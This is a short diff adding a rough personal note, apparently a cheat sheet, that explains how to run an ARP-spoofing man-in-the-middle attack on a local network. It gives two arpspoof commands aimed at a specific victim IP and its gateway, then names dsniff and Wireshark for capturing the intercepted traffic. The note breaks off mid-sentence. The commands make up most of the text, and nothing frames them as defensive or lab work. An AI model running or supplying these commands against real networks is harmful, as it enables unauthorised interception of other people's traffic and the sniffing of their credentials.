@@ -1,0 +1,21 @@
+Spoofing or man in the middle
+
+put this command in forst terminal +>
+
+    arpspoof -i wlx1cbfce04e4dd -t 192.168.43.93 192.168.43.1
+
+and this in second terminal +>
+
+    arpspoof -i wlx1cbfce04e4dd -t  192.168.43.1 192.168.43.93
+
+
+
+see the traffic from trafic analiser tools +>
+
+    dsniff
+
+    wireshark
+    
+    etc...
+    
+all packets you will see are encrypted so...
